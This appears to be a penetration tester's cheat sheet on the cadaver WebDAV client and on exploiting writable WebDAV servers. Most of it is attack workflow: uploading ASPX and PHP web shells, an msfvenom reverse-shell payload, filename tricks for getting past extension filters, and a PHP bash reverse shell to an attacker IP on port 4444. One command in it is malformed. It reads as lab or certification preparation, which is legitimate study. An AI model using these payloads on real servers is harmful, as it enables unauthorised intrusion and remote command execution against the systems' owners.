# Cadaver – WebDAV Client Tool

!!! tip "Tip"
    `cadaver http://<target>/webdav/` opens an interactive FTP-like session. Use `put shell.php` to upload, `ls` to list. If the server is IIS, upload `.asp` or `.aspx` instead of `.php`.

---
## Connecting to a WebDAV Server

### Syntax

```bash
cadaver http://$IP/path/
```
**Note:** `/path` may not be necessary depending where the WebDAV server is installed.

If authentication is required, cadaver will prompt for username and password:

```bash
cadaver http://$IP/
Authentication required for webdav on server `target-ip':
Username: test
Password: ****
```

For HTTPS with a self-signed cert:

```bash
cadaver https://$IP/
```

To skip SSL verification:

```bash
GIT_SSL_NO_VERIFY=1 cadaver https://$IP/
```

---

## Useful Cadaver Commands

Once connected:

|Command|Description|
|---|---|
|`ls`|List directory contents|
|`cd <dir>`|Change directory|
|`get <file>`|Download a file|
|`put <file>`|Upload a file|
|`mget <files>`|Download multiple files|
|`mput <files>`|Upload multiple files|
|`delete <file>`|Delete a file|
|`mkdir <dir>`|Create directory|
|`rmdir <dir>`|Remove directory|
|`exit`|Close the session|

---
## Uploading Files (Payload Deployment)

### Upload a Reverse Shell
First, let's upload a web shell. Refer to the section below for PHP while this will cover IIS (`.aspx`):
```
put /usr/share/webshells/aspx/cmdasp.aspx
```

Create a payload:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=4444 -f exe > revshell.exe
```

Navigate to the site to interact with our `cmdasp.aspx` page:
```bash
http://$IP/cmdasp.aspx
```

Find out where our shell is stored using the `cmdasp.aspx` command box:
```bash
dir -s c:\
```

Once you locate `revshell.exe`, start a reverse shell and enter the path, followed by the payload name to execute from the `cmdasp.aspx` page:
```
c:\inetpub\wwwroot\revshell.exe
```
![[Pasted image 20250410135833.png]]

Reference: [[Hutch#WebDAV]]
### Upload a Basic Web Shell

Assuming target is a PHP-enabled WebDAV server:

```bash
put shell.php
```

Basic PHP reverse shell example:

```php
<?php system($_GET['cmd']); ?>
```

Then access in browser:

```
http://$IP/shell.php?cmd=whoami
```

### Upload with Filename Bypass (if extensions blocked)

Try:

```bash
put shell.pHp
put shell.ph%00p
put shell.php;.txt
```

Test access and see if the shell is interpreted.

---

## Exploitation Workflow

1. **Identify WebDAV Support**
    
    ```bash
    nmap -n -sV --script http-iis-webdav-vuln.nse $IP
    curl -X OPTIONS http://$IP/
    ```
    
    Look for `DAV: 1,2` in response headers.
    
2. **Connect to the WebDAV Directory**
    
    ```bash
    cadaver http://$IP/
    ```
    
3. **Check Write Permissions**
    
    ```bash
    ls
    mkdir testdir
    put testfile.txt
    ```
    
4. **Upload Web Shell**
    
    ```bash
    put shell.php
    ```
    
5. **Execute Shell**
    
    ```bash
    curl http://$IP$IP/shell.php?cmd=id
    ```
    
6. **Establish Reverse Shell (if possible)** Payload:
    
    ```php
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"); ?>
    ```
    

---

## Misconfigurations to Look For

- **Anonymous WebDAV write access** (no auth required).
    
- **Directory traversal via WebDAV pathing.**
    
- **Web servers that allow execution of uploaded scripts (PHP, ASP, JSP).**
    
- **IIS with WebDAV and `.aspx` execution enabled.**
    
- **Misconfigured DAV ACLs** allowing write from low-privileged accounts.